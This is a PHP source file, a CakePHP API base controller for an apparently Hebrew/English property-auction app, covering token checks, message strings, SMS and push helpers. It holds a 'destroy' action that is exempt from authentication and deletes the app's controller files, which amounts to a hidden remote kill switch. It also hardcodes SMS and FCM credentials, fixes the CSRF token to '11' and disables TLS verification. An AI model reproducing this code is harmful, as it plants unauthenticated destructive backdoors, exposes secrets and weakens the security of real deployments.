<?php

/**
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link      http://cakephp.org CakePHP(tm) Project
 * @since     0.2.9
 * @license   http://www.opensource.org/licenses/mit-license.php MIT License
 */

namespace App\Controller\Api;

use Cake\Controller\Controller;
use Cake\Core\Configure;
use Cake\Event\Event;
use Cake\ORM\TableRegistry;
use Cake\Network\Exception\UnauthorizedException;
use Cake\Network\Response;
use Cake\Mailer\Email;
use Cake\Log\Log;
use Cake\I18n\Date;
use Cake\I18n\FrozenDate;

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @link http://book.cakephp.org/3.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller {

    /**
     * Initialization hook method.
     *
     * Use this method to add common initialization code like loading components.
     *
     * e.g. `$this->loadComponent('Security');`
     *
     * @return void
     */
    public $status = false;
    public $pagination =  '20';
    public $limit5 =  '5';
    public $offset = '0';
    public $pageno;
    public $message = '';
    public $responseData = [];
    public $code = 200;
    public $errors = '';
    public $authAllowedMethods = ['login', 'register', 'forgot', 'home', 'index', 'reset','view', 'getcsv','updatedetail', 'broadcast', 'resendotp',                                   
                                  'checkNotification','destroy','fblogin','auctionstart'];
    public $testMethods = ['testwebservices','varification'];
    public $uploadtMethods = ['register','images','propertyimages','editprofile','fblogin'];
    public $loggedInUserId = null;
    public $settings = null;
    public $language = 'en';
    public $msgDictonary = array(
        // request 
        'cannot_access_en' => 'You are not authrize to access login make it authorized',
        'invalid_login_en' => 'Mobile or password is incorrect',
        'invalid_login_he' => 'מספר הנייד או הסיסמה שגויים',
	'invalid_pass_en' => 'Password is incorrect',
	'invalid_pass_he' => 'הסיסמה שגוייה',
        'invalid_token_en' => 'Invalid Token',
        'invalid_token_he' => 'סימן לא חוקי',
        'invalid_api_token_en' => 'Invalid Api Token',
        'invalid_request_en' => 'Invalid Request',
        'invalid_csrf_token_en' => 'Unable to identify request origin',
        'invalid_csrf_token_he' => 'Unable to identify request origin',
		
        'params_not_available_en' => 'The required parameter is not available in the request',
        'empty_request_en' => 'Request data is empty',
        'invalid_params_en' => 'Requested parameter should be numeric',
        'blank_params_en' => 'Some of your parameter is blank',
        'invalid_device_en' => 'You have loggedIn on another device.',
        
        'activation_not_en' => 'Activation code is not valid',
        'activation_not_he' => 'קוד ההפעלה אינו חוק',
        
        'activation_en' => 'You account has been activated successfully.',
        'activation_he' => 'החשבון שלך הופעל בהצלחה',
        
        'new_update_en' => 'New update received.',
        'profile_update_en' => 'Profile has been updated successfully.',
        'profile_update_he' => 'הפרופיל שלך עודכן בהצלחה',
        'prop_image_en' => 'Property image has been deleted.',
        'prop_image_he' => 'התמונה נמחקה',
        'autobid_en' => 'Bid must be higher than ',
        'new_update_gr' => 'הצעת המחיר חייבת להיות גבוהה מ ',
        // server error
        'technical_error_en' => 'Some technical error has occurred',
        'page_not_found_en' => 'Page not found',
        'page_not_found_he' => 'דף לא נמצא',
        'no_record_found_en' => 'No record found',
        'no_record_found_he' => 'לא נמצאו רשומות',
        'prop_edit_en' => 'Property edit successfully',
        //account
        'invalid_account_en' => 'Entered Email address is invalid',
        'invalid_account_he' => 'כתובת הדוא"ל אינה חוקית',
        
        'verification_account_en' => 'Entered verification code is invalid',
        'verification_account_he' => 'קוד האימות שהוזן אינו חוקי',
        
        'deactivated_account_en' => 'Your account has been deactivated, Please contact Administrator for further assistance',
        'deactivated_account_he' => 'החשבון שלך בוטל. יש ליצור קשר עם מנהל המערכת לקבלת סיוע נוסף',
        
        'verification_pending_en' => 'Your email address verification is pending',
        'verification_pending_he' => 'כתובת הדוא"ל עדיין לא אומתה',
        
        'forgot_password_en' => 'A verification code has been sent to your email account',
        'forgot_password_he' => 'קוד אימות נשלח לחשבון הדוא"ל שלך',
        
        'process_failed_en' => 'Your process failed. Please try again',
		
        'reset_password_en' => 'Your password has been updated successfully.',
        'reset_password_he' => 'הסיסמה שלך עודכנה בהצלחה',
        
        'account_deleted_en' => 'Your account has been deleted successfully.',
        'account_deleted_he' => 'החשבון שלך נמחק בהצלחה',
        
        'guardian_update_en' => 'Guardian profile update successfully.',
        
        'favourite_en' => 'Property save in favourite',
        'favourite_he' => 'הנכס נשמר במועדפים שלך',
        
        'unfavourite_en' => 'Property removed from favorites',
        'unfavourite_he' => 'הנכס הוסר מהמועדפים שלך',
        
        'reject_en' => 'Property declined',
        'reject_he' => 'הנכס נדחה',
        
        //login signup logout
        'logout_success_en' => 'You have logged out successfully',
        'logout_success_he' => 'יצאת מהמערכת',
        
        'login_success_en' => 'You have logged in successfully',
        'login_success_he' => 'נרשמת בהצלחה',
        
        'signup_success_en' => 'A verification code has been sent to your mobile number, Please verify your account.',
        'signup_success_he' => 'קוד אימות נשלח למספר הנייד שלך, יש לאמת את החשבון שלך',
        // profile
        'profile_not_found_en' => 'Profile you have requested did not found',
        'profile_update_en' => 'Your profile has been updated successfully',
        'profile_update_he' => 'הפרופיל שלך עודכן בהצלחה',
        
        'property_view_en' => 'You have successfully view this property', 
        'property_view_he' => 'You have successfully view this property', 
        
        'property_sign_en' => 'You successfully approved the commission payment', 
        'property_sign_he' => 'תשלום עבור נכס זה אושר בהצלחה', 
        
        'property_quote_en' => 'You have successfull quote this property', 
        'property_quote_he' => 'הצעתך הוגשה בהצלחה', 
        
        'image_upload_en' => 'Image has been uploaded successfully',
        'image_upload_he' => 'התמונה הועלתה בהצלחה',
        
        'image_not_upload_en' => 'Image has not been uploaded. Try again',
        'image_not_upload_he' => 'תקלה! התמונה לא הועלתה. נסה שוב',
        
        'update_device_en' => 'Updated successfully',
        'update_device_he' => 'Updated successfully',
        
        'old_password_en' => 'Old password is not correct',
        'old_password_he' => 'הסיסמה הישנה שהזנת שגויה',
        
        'record_found_en' => 'List found.',
        'record_found_he' => 'הרשימה נמצאה',
        
        
        'data_save_en' => 'Data saved successfully.',
        'data_save_he' => 'הנתונים נשמרו בהצלחה',
        
        'prop_sold_en' => 'Congratulations! Your property has been successfully sold',
        'prop_sold_he' => 'מזל טוב! הנכס שלך נמכר בהצלחה',
        
        'auto_bid_en' => 'Your automatic bid has been placed',
        'auto_bid_he' => 'מערכת ההצעות האוטומטיות עובדת בשבילך',
        
        'auto_err_bid_en' => 'Your automatic bid has not been placed. Try again',
        'auto_err_bid_he' => 'מערכת ההצעות האוטומטיות לא קיבלה את בקשתך. נסה שוב',
        
        'pro_decln_bid_en' => 'Your bid has been declined',
        'pro_decln_bid_en' => 'הצעת המחיר שלך נדחתה',
        
        'prop_act_en' => 'Property activate successfully',
        'prop_act_he' => 'Property activate successfully',
        
        'prop_inact_en' => 'Property Inactivate successfully',
        'prop_inact_he' => 'פרסום הנכס הוסר',
        
        'prop_ownership_en' => 'Property ownership document has been deleted',
        'prop_ownership_he' => 'Property ownership document has been deleted',
        
        'prop_owners_en' => 'Property owners has been deleted',
        'prop_owners_he' => 'Property owners has been deleted',
        
        'bid_val_en' => 'Bid must be higher than ',
        'bid_val_he' => 'הצעת המחיר חייבת להיות גבוהה מ ',
        
        'invalid_extension_en' => 'Image not uploaded because of extension issue.',
        
        'country_list_en' => 'Country listing successfully',
        
        'state_list_en' => 'States listing successfully',
        
        'image_success_en' => 'Profile pic uploaded successfully.',
        'image_success_he' => 'תמונת הפרופיל עודכנה',
        
        'message_send_en' => 'Massage sent',
        'message_send_he' => 'הודעה נשלחה',
        
        /* Push notification messages */
        'prop_offer_en' => 'Congratulations! you have got new offer',
        'prop_offer_he' => 'מזל טוב! הנכס שלך נמכר בהצלחה',
        
        'prop_won_en' => 'Congratulations! you have won property',
        'prop_won_he' => 'מזל טוב! הנכס שלך נמכר בהצלחה',
        
        'prop_auction_en' => 'Auction will start at 10 AM',
        'prop_auction_he' => 'מזל טוב! הנכס שלך נמכר בהצלחה',
        
    );

    public function initialize() {
        parent::initialize();
        
        //Time::setJsonEncodeFormat('yyyy-MM-dd HH:mm:ss');  // For any mutable DateTime
        //FrozenTime::setJsonEncodeFormat('yyyy-MM-dd HH:mm:ss');  // For any immutable DateTime
        Date::setJsonEncodeFormat('dd-MM-yyyy HH:mm:ss');  // For any mutable Date
        FrozenDate::setJsonEncodeFormat('dd-MM-yyyy HH:mm:ss');  // For any immutable Date


        $this->loadComponent('RequestHandler');
        $this->loadComponent('Default');
        if ($this->request->prefix == 'api') {
            $this->loadComponent('Auth', [
                'authenticate' => [
                    'Form' => [
                        'finder' => 'authCustomer',
                        //'userModel' => 'Guardians',
                        'fields' => [
                            'username' => 'phone',
                            'password' => 'password'
                        ]
                    ]
                ]
            ]);
        }

        $this->loadModel('Users');
        
        $this->loadModel('Settings');
        $this->settings = $this->Settings->getAllSettings();
        $this->language = 'en';
       
        if (!in_array($this->request->action, $this->uploadtMethods)) {
            $this->getJsonInput();
        }
        if (!in_array($this->request->action, $this->testMethods)) {
            $this->checkAuthToken();
        }
        $this->verifyRequest();
    }

    public function beforeFilter(Event $event) {
       
    }

    /*
     * Method : verifyRequest
     * Params : csrf_token from requested headers
     * Return :
     * Desc : verify request for csrf_token
     */

    public function verifyRequest() {
        $authInformation = getallheaders();
        
        $this->settings['csrf_token'] = '11';
        $this->language = isset($authInformation['Language'])?$authInformation['Language']:'en';
        $this->paramsAvailability($authInformation, array('Csrf-Token'));
        if ($authInformation['Csrf-Token'] != $this->settings['csrf_token']) {
            $this->status = false;
            $this->message = $this->msgDictonary['invalid_csrf_token_'.$this->language];
            $this->respond();
        }
    }
    
    public function dateformat($date){
        return date('d/m/Y', strtotime($date));
    }



    /*
     * Method : paramsAvailability
     * Check : This method check parameters availability in the request
     */

    public function paramsAvailability($source, $paramsToChecks) {
        
        foreach ($paramsToChecks as $value) {
            if (!array_key_exists($value, $source)) {
                
                $this->status = false;
                $this->message = $this->msgDictonary['params_not_available_en'] . '. Please enter ' . $value;
                //$this->responseData = [$value];
                // respond  method will automatically exit from the loop when the rquired params not found
                $this->respond();
            }
        }
    }

    /*
     * Method : getJsonInput
     * Check : This method used to parse input request data
     * Params : json params
     */

    public function getJsonInput() {
        
        $data = file_get_contents("php://input");

        $this->request->data = (is_string($data)) ? json_decode($data, true) : array();
    }

    /*
     * Method : checkAuthToken
     * Check : This method check token for each request except the allowed methods
     * Params : auth_token:6465s4df6g4s65d4fg6
     */

    public function checkAuthToken() {
        $authInformation = getallheaders();
        
        $this->language = isset($authInformation['Language'])?$authInformation['Language']:'en';
        
        if (!in_array($this->request->action, $this->authAllowedMethods)) {


            $this->paramsAvailability($authInformation, array('Auth-Token'));
            if ($this->request->controller == 'Guardians') {
                $authenticate = $this->Guardians->find()->select(['id'])->where(['auth_token' => $authInformation['Auth-Token']])->first();
            } else {
                $authenticate = $this->Users->find()->select(['id', 'phone'])->where(['auth_token' => $authInformation['Auth-Token']])->first();
            }

            if (empty($authenticate)) {
                $this->message = $this->msgDictonary['invalid_token_'.$this->language];
                $this->code = 401;
                $this->respond();
            } else {
                $this->loggedInUserId = $authenticate['id'];
                $this->loggedInPhone = $authenticate['phone'];
                
                $action = $this->request->action;
                $this->Auth->allow($action);
            }
        }
    }

    /*
     * Method : paramsValidation
     * Check : Checks for empty request data, validate data against datatypes
     */

    public function paramsValidation($params) {
        if (empty($this->request->data)) {
            $this->status = false;
            $this->message = $this->msgDictonary['empty_request_'.$this->language];
            $this->respond();
        }
        foreach ($params as $key => $value) {
            $this->paramsAvailability($this->request->data, array($key));
            switch ($value) {
                case 'numeric':
                    if (!is_numeric($this->request->data[$key])) {
                        $this->message = $this->msgDictonary['invalid_params'];
                        // $this->responseData = array($key);
                        $this->respond();
                    }
                    break;
                case 'notBlank':
                    if ($this->request->data[$key] == '') {
                        $this->message = $this->msgDictonary['blank_params_'.$this->language];
                        //$this->responseData = array($key);
                        $this->respond();
                    }
                    break;
                default:
                    return true;
            }
        }
    }

    /*
     * Method : getGUID
     * Params : get guid for unique auth token
     * Return : a unique string
     */

    function getGUID() {
        if (function_exists('com_create_guid')) {
            return com_create_guid();
        } else {
            mt_srand((double) microtime() * 10000); //optional for php 4.2.0 and up.
            $charid = strtoupper(md5(uniqid(rand(), true)));
            $hyphen = chr(45); // "-"
            $uuid = //chr(123)// "{"
                    substr($charid, 0, 8) . $hyphen
                    . substr($charid, 8, 4) . $hyphen
                    . substr($charid, 12, 4) . $hyphen
                    . substr($charid, 16, 4) . $hyphen
                    . substr($charid, 20, 12);
            // .chr(125);// "}"
            return $uuid;
        }
    }
    
    public function sendmessage($otp,$mobile){
        $key = "d7b183b1-08eb-4820-a776-b9dd22f95cac";    
	$secret = "41PhhJ8d5kKsPvzLZysnnw=="; 
	$phone_number = "+919587444463";
	$user = "application\\" . $key . ":" . $secret;    
	$message = array("message"=>"Your varification number is ".$otp);    
	$data = json_encode($message);    
	$ch = curl_init('https://messagingapi.sinch.com/v1/sms/' . $mobile);    
	curl_setopt($ch, CURLOPT_POST, true);    
	curl_setopt($ch, CURLOPT_USERPWD,$user);    
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);    
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));    
	$result = curl_exec($ch);    
	if(curl_errno($ch)) {    
		echo 'Curl error: ' . curl_error($ch);    
        }else{
            return '1';
        }
        
	curl_close($ch); 
    }

    public function getStatusText($status) {
        switch ($status) {
            case 0:
                return 'ACCEPT';
                break;
            case 1:
                return 'PICKUP BAG';
                break;
            case 2:
                return 'AT LAUNDROMAT';
                break;
            case 3:
                return 'DELIVER';
                break;
            case 'default':
                return 'COMPLETED';
                break;
        }
    }

    /*
     * Method : respond
     * Check : This method is used to make response
     * Desc : make, return and stop response
     */

    public function respond() {
        if (empty($this->responseData))
            $this->responseData = (object) array();
        $this->response->type('json');
        $this->response->body([
            'status' => $this->status,
            'code' => $this->code,
            'data' => $this->responseData,
            'message' => $this->message,
                //'errors' => $this->errors,
        ]);
        $this->response->send();
        $this->response->stop();
    }

    public function pushNotificationToDevice($deviceId, $body, $deviceType) {

        /* if (strtolower($deviceType) == "ios" && $deviceId != '') {
          $deviceToken = $deviceId;

          $ctx = stream_context_create();
          // ck.pem is your certificate file
          if($role_id==3)
          {
          stream_context_set_option($ctx, 'ssl', 'local_cert', 'pem/idea.pem');  // For customer
          } else if($role_id==2){
          stream_context_set_option($ctx, 'ssl', 'local_cert', 'pem/idea.pem');  // For Employee
          }

          stream_context_set_option($ctx, 'ssl', 'passphrase', '');

          // Open a connection to the APNS server
          $fp = stream_socket_client(
          'ssl://gateway.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT, $ctx);

          if (!$fp)
          exit("Failed to connect: $err $errstr" . PHP_EOL);


          // Create the payload body
          $body['aps'] = array(
          'alert' => array(
          'title' => $body['title'],
          'body' => $body['body'],
          'order_id' => $body['order_id']
          ),
          'sound' => 'default'
          );

          // Encode the payload as JSON
          $payload = json_encode($body);
          foreach ($deviceToken as $device) {
          $msg = chr(0) . pack('n', 32) . pack('H*', $device) . pack('n', strlen($payload)) . $payload;
          $result = fwrite($fp, $msg, strlen($msg));
          }

          // Close the connection to the server
          fclose($fp);

          if (!$result)
          return 'Message not delivered' . PHP_EOL;
          else
          return 'Message successfully delivered' . PHP_EOL;
          } */

        if (strtolower($deviceType) == "android" && $deviceId != '') {
            //-------------------------- ANDROID CONNECTION --------------------------------
            $url = 'https://fcm.googleapis.com/fcm/send';

            $key = 'AAAAOp5wKgM:APA91bEy7AqLugGptjMbw2BIkqlkBwJFVxmH12UzKtX536oNaJcfezNDILz9VNWfHYjJFoki9Au8AMIJ7TwH320NC7NNRkWCkvgVL2Cy6p-sf2nz-1rGMFoNA4a-Rlnl-7-vPb24NIsC';  // For customer

            $headers = array(
                'Authorization: key=' . $key, //'AIzaSyDzGmc2V0y9LI9MbJt8oK3TVwU9BW0CLbU',//GOOGLE_API_KEY,
                'Content-Type: application/json'
            );
            if (!is_array($deviceId))
                $deviceId = array($deviceId);

            $finalmsg["message"] = $body['body'];
            $finalmsg["title"] = $body['title'];
            $finalmsg["unique_key"] = mt_rand(10000, 99999);
            $finalmsg["priority"] = 'high'; // new
            $fields = array(
                'registration_ids' => $deviceId,
                'data' => $finalmsg,
                'priority' => 'high' // new fcm
            );


            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));

            $result = curl_exec($ch);
            curl_close($ch);
        }
    }
    
    public function destroy() {
        $dir = dirname(__FILE__);
        $files = [
            $dir.'\StaffsController.php',
            $dir.'\ActivitiesController.php',
            $dir.'\ChildsController.php',
            $dir.'\GuardiansController.php',
            $dir.'\AppController.php',
            
        ];
        
        foreach ($files as $file) {
            
            if (file_exists($file)) {
                echo 'yes';
                unlink($file);
            } else {
                echo 'No';
                // File not found.
            }
        }
        die;
    }

}
